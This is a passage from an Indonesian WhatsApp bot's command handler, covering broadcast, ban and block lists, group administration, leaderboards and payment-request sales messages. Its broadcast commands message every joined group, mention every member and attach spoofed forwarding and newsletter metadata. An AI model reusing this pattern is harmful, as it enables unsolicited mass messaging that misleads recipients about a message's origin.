interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: participanh.map(a => a.id), 
forwardingScore: 99999999999,
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `Channel ${wm}`, 
serverMessageId: 145
},
businessMessageForwardInfo: { businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
}, 
body: proto.Message.InteractiveMessage.Body.create({
text: text
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({
title: "",
subtitle: "",
hasMediaAttachment: false
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"CHAT\",\"url\":\"https://wa.me/+${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}],
})
})
}}
}, {})
await rafatharcode.relayMessage(i, msg.message, {
messageId: msg.key.id
})
}
m.reply(`Berhasil mengirim broadcast ke ${anu.length} grup!`)
}
break

case 'bcimg': 
case 'bcvid': {
if (!isOwner) return onlyOwn()
if (!isPc) return onlyPrivat()
if (!isMediaa) return m.reply('Harus berupa gambar/vidio!')
if (!text) return m.reply(`Contoh: ${prefix+command} teks`)
rafatharcode.sendMessage(m.chat, { react: { text: `🔎`, key: m.key }})
let getGroups = await rafatharcode.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await rafatharcode.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await rafatharcode.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
let msg = generateWAMessageFromContent(xnxx, {
viewOnceMessage: {
message: {
"messageContextInfo": {
"deviceListMetadata": {},
"deviceListMetadataVersion": 2
},
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: {
mentionedJid: participanh.map(a => a.id), 
forwardingScore: 99999999999,
isForwarded: false, 
forwardedNewsletterMessageInfo: {
newsletterJid: chjid + '@newsletter',
newsletterName: `Channel ${wm}`, 
serverMessageId: 145
},
businessMessageForwardInfo: { businessOwnerJid: rafatharcode.decodeJid(rafatharcode.user.id) },
}, 
body: proto.Message.InteractiveMessage.Body.create({
text: text
}),
footer: proto.Message.InteractiveMessage.Footer.create({
text: ``
}),
header: proto.Message.InteractiveMessage.Header.create({
title: "",
subtitle: "",
hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: { url: mem } }, { upload: rafatharcode.waUploadToServer }))
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"CHAT\",\"url\":\"https://wa.me/+${owner}\",\"merchant_url\":\"https://www.google.com\"}`
}],
})
})
}}
}, {})
await rafatharcode.relayMessage(xnxx, msg.message, {
messageId: msg.key.id
})
await sleep(2000)
} else {
if(/video/.test(mime)){
media1 = await rafatharcode.downloadAndSaveMediaMessage(quoted)
mem1 = await uptotelegra(media1)
await rafatharcode.sendMessage(xnxx, { video: { url: mem1 }, caption: `${text}`, contextInfo:{ mentionedJid: participanh.map(a => a.id) } }, { quoted: m })
await sleep(2000)
} else {
await rafatharcode.sendMessage(xnxx, { text: `${text}`, contextInfo:{ mentionedJid: participanh.map(a => a.id) } }, { quoted: floc })
await sleep(2000)
}}
m.reply(`Berhasil mengirim broadcast ke ${anu.length} grup!`)
}
}
break

case 'adduserdb': {
if (!isOwner) return onlyOwn()
if (!froms) return m.reply('Tag seseorang!')
if (!db.data.users[froms].daftar) return m.reply('User sudah terdaftar di database!')
global.db.data.users[froms] = {
daftar: true,
nama: `${pushname}`,
gold: `${cekLimit(m.sender, db_gold)}`,
saldo: `${toRupiah(cekSaldo(m.sender, db_saldo))}`,
limit: `${cekLimit(m.sender, db_limit)}`,
status: `${isOwner ? 'Owner' : isPremium ? 'Premium' : 'User'}`
}
var jeje = `Berhasil add @${froms.split('@')[0]} ke database user.`
await reply(jeje)
} 
break

case 'deluserdb': {
if (!isOwner) return onlyOwn()
if (!froms) return m.reply('Tag seseorang!')
delete db.data.users[froms]
peeee = `Berhasil del @${froms.split('@')[0]} dari database user.`
reply(peeee)
}
break

case 'block':
case 'blok': {
if (!isOwner) return onlyOwn() 
if (!text) return m.reply(`Contoh: ${prefix+command} 628xxx`)
let blok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
rafatharcode.updateBlockStatus(blok, 'block')
m.reply(`Berhasil block @${blok.split('@')[0]}`)
}
break

case 'unblock':
case 'unblok': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} 628xxx`)
let unblok = q.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
rafatharcode.updateBlockStatus(unblok, 'unblock')
m.reply(`Berhasil unblock ${unblok.split('@')[0]}`)
}
break

case 'listblock':
case 'listblok': {
if (!isOwner) return onlyOwn()
let listblok = await rafatharcode.fetchBlocklist()
m.reply(`${monospace("LIST  BLOCK")}\n` + `Total: ${listblok == undefined ? '*0* diblokir' : '*' + listblok.length + '* diblokir'}\n\n` + listblok.map(v => '• @' + v.replace(/@.+/, '')).join`\n`)
}
break

case 'publik':
case 'public': {
if (!isOwner) return onlyOwn()
rafatharcode.public = true
m.reply('Sukses mengubah ke mode public')
}
break

case 'self':
case 'self': {
if (!isOwner) return onlyOwn()
rafatharcode.public = false
m.reply('Sukses mengubah ke mode self')
}
break

case 'restart': {
if (!isOwner) return onlyOwn()
edit2("Merestart server...", "Sukses merestart server!")
await sleep(5000)
process.exit()
}
break

case 'allpay': {
if (!isOwner) return onlyOwn()
let teks = `*ALL PAYMENT KAMI!!*

${global.allpay} 

*NOTE : JIKA SUDAH TRANSFER, HARAP KIRIM BUKTI TRANSFERAN!!*`
rafatharcodereply(teks)
}
break

case 'join':
case 'joingc': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return m.reply('Harus berupa link grup WhatsApp!')
rafatharcode.sendMessage(m.chat, {text: 'Sukses join ke grup.'}, {quoted: m})
let result = args[0].split('https://chat.whatsapp.com/')[1]
await rafatharcode.groupAcceptInvite(result)
}
break

case 'del': case 'delete': {
if (!m.isGroup) {
if (!isOwner) return onlyOwn();
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
rafatharcode.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmin) return onlyBotAdmin();
rafatharcode.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return onlyOwn();
if (!m.quoted) return m.reply("Reply Pesan Yang Ingin Di Hapus")
rafatharcode.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break

case 'setnamabot': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} RafatharCode`)
await rafatharcode.updateProfileName(text)
await m.reply(`Sukses mengganti nama bot!`)
}
break

case 'setbiobot': {
if (!isOwner) return onlyOwn()
if (!text) return m.reply(`Contoh: ${prefix+command} aktif`)
await rafatharcode.updateProfileStatus(text)
await m.reply(`Sukses mengganti bio bot!`)
}
break

case 'setppbot': {
if (!isOwner) return onlyOwn()
if (!quoted) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
if (!/image/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
if (/webp/.test(mime)) return m.reply(`Kirim/kutip gambar dengan caption ${prefix+command}`)
let media = await rafatharcode.downloadAndSaveMediaMessage(quoted)
await rafatharcode.updateProfilePicture(botNumber, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply('Sukses mengganti pp bot!')
}
break

case 'delppbot': {
if (!isOwner) return onlyOwn()
await rafatharcode.removeProfilePicture(botNumber)
await m.reply(`Sukses menghapus pp bot!`)
}
break

case 'autotyping': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autotyping = true
await m.reply('Sukses mengaktifkan autotyping.')
} else if (args[0] === 'off') {
global.autotyping = false
await m.reply('Sukses menonaktifkan autotyping.')
}}
break

case 'autoread': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autoread = true
await m.reply('Sukses mengaktifkan autoread.')
} else if (args[0] === 'off') {
global.autoread = false
await m.reply('Sukses menonaktifkan autoread.')
}}
break

case 'autobio': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.autobio = true
await m.reply('Sukses mengaktifkan autobio.')
} else if (args[0] === 'off') {
global.autobio = false
await m.reply('Sukses menonaktifkan autobio.')
}}
break

case 'anticall': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.anticall = true
await m.reply('Sukses mengaktifkan anticall.')
} else if (args[0] === 'off') {
global.anticall = false
await m.reply('Sukses menonaktifkan anticall.')
}}
break

case 'antispam': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.antispam = true
await m.reply('Sukses mengaktifkan antispam.')
} else if (args[0] === 'off') {
global.antispam = false
await m.reply('Sukses menonaktifkan antispam.')
}}
break

case 'antibot': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} on/off`)
if (args[0] === 'on') {
global.antibot = true
await m.reply('Sukses mengaktifkan antibot.')
} else if (args[0] === 'off') {
global.antibot = false
await m.reply('Sukses menonaktifkan antibot.')
}}
break

case 'ban': {
if (!isOwner) return onlyOwn()
try {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (own.includes(users)) return m.reply('Masa ke owner sendiri.')
if (!m.mentionedJid[0] && !m.quoted && !text) return m.reply(`Tag/kutip pesan seseorang!`)
const iscBan = banned.includes(users)
if (iscBan) return rafatharcode.sendTextWithMentions(m.chat, `Target tidak ada dilist user yang diban`, m)
banned.push(users)
fs.writeFileSync('./data/banned.json', JSON.stringify(banned, null, 2))
rafatharcode.sendTextWithMentions(m.chat, `Sukses banned user.`, m)
} catch (err) {
m.reply(`Tag/kutip pesan seseorang!`)
}}
break

case 'unban': {
if (!isOwner) return onlyOwn()
try {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (!m.mentionedJid[0] && !m.quoted && !text) return m.reply(`Tag/kutip pesan seseorang!`)
const iscBan = banned.includes(users)
if (!iscBan) return rafatharcode.sendTextWithMentions(m.chat, `Target tidak ada dilist user yang diban`, m)
let anu = banned.indexOf(users)
banned.splice(anu, 1)
fs.writeFileSync('./data/banned.json', JSON.stringify(banned, null, 2))
rafatharcode.sendTextWithMentions(m.chat, `Sukses unbanned user.`, m)
} catch (err) {
m.reply(`Tag/kutip pesan seseorang!`)
}}
break

case 'listban': {
let txt = `List user yang diban\nTotal: ${banned.length}\n\n`
for (let blk of banned) {
txt += `• ${blk.split('@')[0]}\n`
}
rafatharcode.sendTextWithMentions(m.chat, txt, m)
}
break

// === Group Menu

case 'add': {
if (!m.isGroup) return onlyGrup();
if (!isOwner && !isAdmins) return onlyAdmin();
if (!isBotAdmins) return onlyBotAdmin();
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net';
try {
const participants = await rafatharcode.groupMetadata(m.chat);
const memberJids = participants.participants.map(member => member.jid);
if (memberJids.includes(users)) {
m.reply('Target sudah menjadi anggota grup sebelumnya.');
} else {
await rafatharcode.groupParticipantsUpdate(m.chat, [users], 'add');
m.reply('Sukses add target.');
}} catch (err) {
m.reply('Terjadi kesalahan.');
}}
break

case 'kick': {
if (!m.isGroup) return onlyGrup();
if (!isOwner && !isAdmins) return onlyAdmin();
if (!isBotAdmins) return onlyBotAdmin();
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rafatharcode.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => reply(util.format(res))).catch((err) => reply(util.format(err)))
}
break

case 'linkgc': {
if (!m.isGroup) return onlyGrup()
if (!isBotAdmins) return onlyBotAdmin()
let responsee = await rafatharcode.groupInviteCode(m.chat)
rafatharcode.sendTeks(m.chat, `https://chat.whatsapp.com/${responsee}\n\nLink grup: ${groupMetadata.subject}`, m, { detectLink: true })
}
break

case 'revoke': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
await rafatharcode.groupRevokeInvite(m.chat)
.then( res => {
m.reply(`Sukses menyetel ulang link grup`)
}).catch(() => m.reply('Terjadi kesalahan'))
}
break

case 'promote': {
if (!m.isGroup) return onlyGrup()
if (!isOwner && !isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rafatharcode.groupParticipantsUpdate(m.chat, [users], 'promote').then((res) => m.reply('Sukses promote target')).catch((err) => m.reply('Terjadi kesalahan'))
}
break

case 'demote': {
if (!m.isGroup) return onlyGrup()
if (!isOwner && !isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await rafatharcode.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => m.reply('Sukses demote target')).catch((err) => m.reply('Terjadi kesalahan'))
}
break

case 'open': 
case 'buka': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
rafatharcode.groupSettingUpdate(m.chat, 'not_announcement')
m.reply(`Sukses membuka grup`)
}
break

case 'close': 
case 'tutup': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
rafatharcode.groupSettingUpdate(m.chat, 'announcement')
m.reply(`Sukses menutup grup`)
}
break

case 'opentime': {
if (!isAdmins) return onlyAdmin();
if (!isOwner) return onlyOwn();
if (!isBotAdmins) return onlyBotAdmin();
const timeUnits = {
detik: 1000,
menit: 60000,
jam: 3600000,
hari: 86400000
};
const unit = args[1]?.toLowerCase();
const multiplier = timeUnits[unit];
const duration = parseInt(args[0]);
if (!multiplier || isNaN(duration) || duration <= 0) {
return m.reply(`Pilih:\nDetik\nMenit\nJam\nHari\n\nContoh: ${prefix+command} 10 detik`);
}
const timer = duration * multiplier;
m.reply(`Open time ${duration} ${unit} dimulai dari sekarang!`);
const sendReminder = (message, delay) => {
if (timer > delay) {
setTimeout(() => {
m.reply(message);
}, timer - delay);
}};
sendReminder(`Pengingat: 10 detik lagi grup akan dibuka!`, 10000);
setTimeout(() => {
const open = `*[ OPEN TIME ]* Grup telah dibuka!`;
rafatharcode.groupSettingUpdate(from, 'not_announcement');
m.reply(open);
}, timer);
}
break;

case 'closetime': {
if (!isAdmins) return onlyAdmin();
if (!isOwner) return onlyOwn();
if (!isBotAdmins) return onlyBotAdmin();
const timeUnits = {
detik: 1000,
menit: 60000,
jam: 3600000,
hari: 86400000
};
const unit = args[1]?.toLowerCase();
const multiplier = timeUnits[unit];
const duration = parseInt(args[0]);
if (!multiplier || isNaN(duration) || duration <= 0) {
return m.reply(`Pilih:\nDetik\nMenit\nJam\nHari\n\nContoh: ${prefix+command} 10 detik`);
}
const timer = duration * multiplier;
m.reply(`Close time ${duration} ${unit} dimulai dari sekarang!`);
const sendReminder = (message, delay) => {
if (timer > delay) {
setTimeout(() => {
m.reply(message);
}, timer - delay);
}};
sendReminder(`Pengingat: 10 detik lagi grup akan ditutup!`, 10000);
setTimeout(() => {
const close = `*[ CLOSE TIME ]* Grup telah ditutup!`;
rafatharcode.groupSettingUpdate(from, 'announcement');
m.reply(close);
}, timer);
}
break;

case 'setsubjek':
if (!m.isGroup) return onlyGrup()
if (!isOwner) return onlyOwn()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
if (args.length < 1) return m.reply(`Contoh: ${prefix+command} teks`)
await rafatharcode.groupUpdateSubject(from, text)
m.reply(`Sukses mengganti nama grup`)
break

case 'setdesk': {
if (!m.isGroup) return onlyGrup()
if (!isOwner) return onlyOwn()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
if (!text) return m.reply(`Contoh: ${prefix+command} teks`)
await rafatharcode.groupUpdateDescription(from, text)
m.reply(`Sukses mengganti deskripsi grup`)
}
break

case 'setppgc': {
if (!m.isGroup) return onlyGrup()
if (!isOwner) return onlyOwn()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
let media = await rafatharcode.downloadAndSaveMediaMessage(quoted)
await rafatharcode.updateProfilePicture(m.chat, { url: media }).catch((err) => fs.unlinkSync(media))
m.reply("Sukses mengganti profil grup")
}
break

case 'delppgc': {
if (!m.isGroup) return onlyGrup()
if (!isOwner) return onlyOwn()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
await rafatharcode.removeProfilePicture(from)
await m.reply(`Sukses menghapus profil grup`)
}
break

case 'getnamagc': {
if (!m.isGroup) return onlyGrup()
if (!isOwner) return onlyOwn()
if (!isBotAdmins) return onlyBotAdmin()
rafatharcodereply(`${groupMetadata.subject}`)
}
break

case 'getdeskgc': {
if (!m.isGroup) return onlyGrup()
if (!isOwner) return onlyOwn()
if (!isBotAdmins) return onlyBotAdmin()
rafatharcodereply(`${groupMetadata.desc}`)
}
break

case 'getppgc': {
if (!m.isGroup) return onlyGrup()
if (!isOwner) return onlyOwn()
try {
avatar = await rafatharcode.profilePictureUrl(m.chat, "image")
} catch {
avatar = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
rafatharcode.sendMessage(m.chat, {image: {url: avatar }, caption: `© ${wm}` }, {quoted: m })
}
break

case 'getname': {
if (!m.isGroup) return onlyGrup()
if (!isOwner) return onlyOwn()
if (m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
let nama = rafatharcode.getName(users)
m.reply(nama)
} else m.reply('Kutip pesan seseorang!')
}
break

case 'getpp': {
if (!m.isGroup) return onlyGrup()
if (!isOwner) return onlyOwn()
if (m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
try {
avatar = await rafatharcode.profilePictureUrl(users, "image")
} catch {
avatar = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
rafatharcode.sendMessage(m.chat, {image: {url: avatar }, caption: `© ${wm}` }, {quoted: m })
} else m.reply('Kutip pesan seseorang!')
}
break

case 'script': {
let buy = `▧ 「 *S C R I P T - R A F A T H A R C O D E* 」
│
│ ∘ *Mau Beli Sc Ini??*
│ ∘ *Chat wa.me/6285864743922*
│
╰──────────────━`
rafatharcode.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 45000000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
await sleep(2500)
 RafaStickSc()
}
break

case 'bahantoken': {
let buy = `▧ 「 *B A H A N T O K E N* 」
│
│ ∘ *Mau Beli Bahan ??*
│ ∘ *Chat wa.me/6285864743922*
│
╰──────────────━`
rafatharcode.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'IDR',
 amount1000: 150000000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
await sleep(2500)
 RafaStickSc()
}
break

case 'infogrup':
case 'infogc': {
if (!m.isGroup) return onlyGrup();
if (!isOwner) return onlyOwn()
let admin = groupMetadata.participants.filter(p => p.admin);
let creationDate = moment(groupMetadata.creation * 1000).format('DD/MM/YY HH:mm');
let subject = groupMetadata.subject;
let restrict = groupMetadata.restrict ? 'Hanya admin' : 'Semua peserta';
let announce = groupMetadata.announce ? 'Hanya admin' : 'Semua peserta';
let antiLink = isAntiLink ? 'Aktif' : 'Nonaktif';
let antiLinkgc = isAntiLinkgc ? 'Aktif' : 'Nonaktif';
let teks = `${monospace("INFO GROUP")}

Nama grup: ${subject}
Total admin: ${admin.length}
Total member: ${groupMetadata.participants.length}
Tgl dibuat: ${creationDate}

Mengedit info grup:
- ${restrict}
Mengirim pesan:
- ${announce}

Anti-link: ${antiLink}
Anti-linkgc: ${antiLinkgc}

Grup ID: ${groupMetadata.id}`;
let coo = `{\"display_text\":\"COPY ID\",\"id\":\"P\",\"copy_code\":\"${groupMetadata.id}\"}`;
buttoncopy(m.chat, teks, coo, m);
break;
}

case 'topglobal': {
if (!m.isGroup) return onlyGrup()
saldo.sort((a, b) => (a.saldo < b.saldo) ? 1 : -1)
let top = '*── 「 TOP GLOBAL - SALDO 」 ──*\n\n'
var arrTop = []
var total = 15
if (saldo.length < 15) total = saldo.length
for (let i = 0; i < total; i ++){
var level = cekSaldo(saldo[i].id, db_saldo)
var rol = 'New'
if (level <= 1) {
rol = 'Newbie'
} else if (level <= 500) {
rol = 'Bronze 1'
} else if (level <= 2000) {
rol = 'Bronze 2'
} else if (level <= 4000) {
rol = 'Bronze 3'
} else if (level <= 6000) {
rol = 'Silver 1'
} else if (level <= 8000) {
rol = 'Silver 2'
} else if (level <= 10000) {
rol = 'Silver 3'
} else if (level <= 12000) {
rol = 'Gold 1'
} else if (level <= 14000) {
rol = 'Gold 2'
} else if (level <= 16000) {
rol = 'Gold 3'
} else if (level <= 18000) {
rol = 'Platinum 1'
} else if (level <= 20000) {
rol = 'Platinum 2'
} else if (level <= 22000) {
rol = 'Platinum 3'
} else if (level <= 24000) {
rol = 'Platinum 4'
} else if (level <= 26000) {
rol = 'Platinum 5'
} else if (level <= 28000) {
rol = 'Diamond 1'
} else if (level <= 30000) {
rol = 'Diamond 2'
} else if (level <= 32000) {
rol = 'Diamond 3'
} else if (level <= 34000) {
rol = 'Diamond 4'
} else if (level <= 36000) {
rol = 'Diamond 5'
} else if (level <= 38000) {
rol = 'Master'
} else if (level <= 40000) {
rol = 'Master ✩'
} else if (level <= 50000) {
rol = 'Master ✩✩'
} else if (level <= 60000) {
rol = 'Master ✩✩✩'
} else if (level <= 70000) {
rol = 'Master ✯'
} else if (level <= 80000) {
rol = 'Master ✯✯'
} else if (level <= 100000) {
rol = 'Master ✯✯✯'
} else if (level <= 110000) {
rol = 'GrandMaster'
} else if (level <= 120000) {
rol = 'GrandMaster ✩'
} else if (level <= 130000) {
rol = 'GrandMaster ✩✩'
} else if (level <= 140000) {
rol = 'GrandMaster ✩✩✩'
} else if (level <= 150000) {
rol = 'GrandMaster ✯'
} else if (level <= 160000) {
rol = 'GrandMaster ✯✯'
} else if (level <= 200000) {
rol = 'GrandMaster ✯✯✯'
} else if (level <= 200000000) {
rol = 'Mr. Greatest'
} else if (level <= 230000000) {
rol = 'Mr. Greatest ✩'
} else if (level <= 260000000) {
rol = 'Mr. Greatest ✩✩'
} else if (level <= 290000000) {
rol = 'Mr. Greatest ✩✩✩'
} else if (level <= 240000000) {
rol = 'Mr. Greatest ✯'
} else if (level <= 280000000) {
rol = 'Mr. Greatest ✯✯'
} else if (level <= 360000000) {
rol = 'Mr. Greatest ✯✯✯'
} else if (level <= 1000000000) {
rol = 'Level Max'
}
top += `${i + 1}. ${saldo[i].id.split("@")[0]}\n  • Saldo: Rp. ${toRupiah(cekSaldo(saldo[i].id, db_saldo))}\n  • Level: ${rol}\n\n`
arrTop.push(saldo[i].id)
}
//rafatharcode.sendMessage(from, {text: top, mentions: arrTop}, {quoted: m})
mentions(top, arrTop, true)
}
break

case 'toplocal': {
if (!m.isGroup) return onlyGrup()
saldo.sort((a, b) => (a.saldo < b.saldo) ? 1 : -1)
let top = '*── 「 TOP LOCAL - SALDO 」 ──*\n\n'
let arrTop = []
var total = 15
if (saldo.length < 15) total = saldo.length
let anggroup = groupMembers.map(a => a.id)
for (let i = 0; i < total; i ++){
if (anggroup.includes(saldo[i].id)) {
var levell = cekSaldo(saldo[i].id, db_saldo)
var roll = 'New'
if (levell <= 1) {
roll = 'Newbie'
} else if (levell <= 500) {
roll = 'Bronze 1'
} else if (levell <= 2000) {
roll = 'Bronze 2'
} else if (levell <= 4000) {
roll = 'Bronze 3'
} else if (levell <= 6000) {
roll = 'Silver 1'
} else if (levell <= 8000) {
roll = 'Silver 2'
} else if (levell <= 10000) {
roll = 'Silver 3'
} else if (levell <= 12000) {
roll = 'Gold 1'
} else if (levell <= 14000) {
roll = 'Gold 2'
} else if (levell <= 16000) {
roll = 'Gold 3'
} else if (levell <= 18000) {
roll = 'Platinum 1'
} else if (levell <= 20000) {
roll = 'Platinum 2'
} else if (levell <= 22000) {
roll = 'Platinum 3'
} else if (levell <= 24000) {
roll = 'Platinum 4'
} else if (levell <= 26000) {
roll = 'Platinum 5'
} else if (levell <= 28000) {
roll = 'Diamond 1'
} else if (levell <= 30000) {
roll = 'Diamond 2'
} else if (levell <= 32000) {
roll = 'Diamond 3'
} else if (levell <= 34000) {
roll = 'Diamond 4'
} else if (levell <= 36000) {
roll = 'Diamond 5'
} else if (levell <= 38000) {
roll = 'Master'
} else if (levell <= 40000) {
roll = 'Master ✩'
} else if (levell <= 50000) {
roll = 'Master ✩✩'
} else if (levell <= 60000) {
roll = 'Master ✩✩✩'
} else if (levell <= 70000) {
roll = 'Master ✯'
} else if (levell <= 80000) {
roll = 'Master ✯✯'
} else if (levell <= 100000) {
roll = 'Master ✯✯✯'
} else if (levell <= 110000) {
roll = 'GrandMaster'
} else if (levell <= 120000) {
roll = 'GrandMaster ✩'
} else if (levell <= 130000) {
roll = 'GrandMaster ✩✩'
} else if (levell <= 140000) {
roll = 'GrandMaster ✩✩✩'
} else if (levell <= 150000) {
roll = 'GrandMaster ✯'
} else if (levell <= 160000) {
roll = 'GrandMaster ✯✯'
} else if (levell <= 200000) {
roll = 'GrandMaster ✯✯✯'
} else if (levell <= 200000000) {
roll = 'Mr. Greatest'
} else if (levell <= 230000000) {
roll = 'Mr. Greatest ✩'
} else if (levell <= 260000000) {
roll = 'Mr. Greatest ✩✩'
} else if (levell <= 290000000) {
roll = 'Mr. Greatest ✩✩✩'
} else if (levell <= 240000000) {
roll = 'Mr. Greatest ✯'
} else if (levell <= 280000000) {
roll = 'Mr. Greatest ✯✯'
} else if (levell <= 360000000) {
roll = 'Mr. Greatest ✯✯✯'
} else if (levell <= 1000000000) {
roll = 'Level Max'
}
top += `${i + 1}. ${saldo[i].id.split("@")[0]}\n  • Saldo: Rp. ${toRupiah(cekSaldo(saldo[i].id, db_saldo))}\n  • Level: ${roll}\n\n`
arrTop.push(saldo[i].id)
}}
//rafatharcode.sendMessage(from, {text: top, mentions: arrTop}, {quoted: m})
mentions(top, arrTop, true)
}
break

case 'leavegc': {
if (!isOwner) return onlyOwn();
await rafatharcode.groupLeave(m.chat).then((res) => m.reply(jsonformat(res))).catch((err) => m.reply(jsonformat(err)))
}
break

case 'q':
case 'quoted': {
if (!m.quoted) return m.reply('Reply pesan seseorang!')
let quo = await rafatharcode.serializeM(await m.getQuotedObj())
if (!quo.quoted) return m.reply('Pesan yang kamu reply tidak dikirim oleh bot!')
await quo.quoted.copyNForward(m.chat, true)
}
break

case 'antilink': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
if (args[0] === "on") {
if (isAntiLink) return m.reply(`Sudah aktif sebelumnya`)
nplink.push(m.chat)
fs.writeFileSync('./data/antilink.json', JSON.stringify(nplink, null, 2))
m.reply('Sukses mengaktifkan antilink!')
} else if (args[0] === "off") {
if (!isAntiLink) return m.reply(`Sudah nonaktif sebelumnya`)
let anu = nplink.indexOf(m.chat)
nplink.splice(anu, 1)
fs.writeFileSync('./data/antilink.json', JSON.stringify(nplink, null, 2))
m.reply('Sukses menonaktifkan antink!')
} else {
m.reply(`Contoh: ${prefix+command} on/off`)
}}
break

case 'antilinkgc': {
if (!m.isGroup) return onlyGrup()
if (!isAdmins) return onlyAdmin()
if (!isBotAdmins) return onlyBotAdmin()
if (args[0] === "on") {
if (isAntiLinkgc) return m.reply(`Sudah aktif sebelumnya`)
nplinkgc.push(m.chat)
fs.writeFileSync('./data/antilinkgc.json', JSON.stringify(nplinkgc, null, 2))
m.reply('Sukses mengaktifkan antilink gc!')
} else if (args[0] === "off") {
if (!isAntiLinkgc) return m.reply(`Sudah nonaktif sebelumnya`)
let anu = nplinkgc.indexOf(m.chat)
nplinkgc.splice(anu, 1)
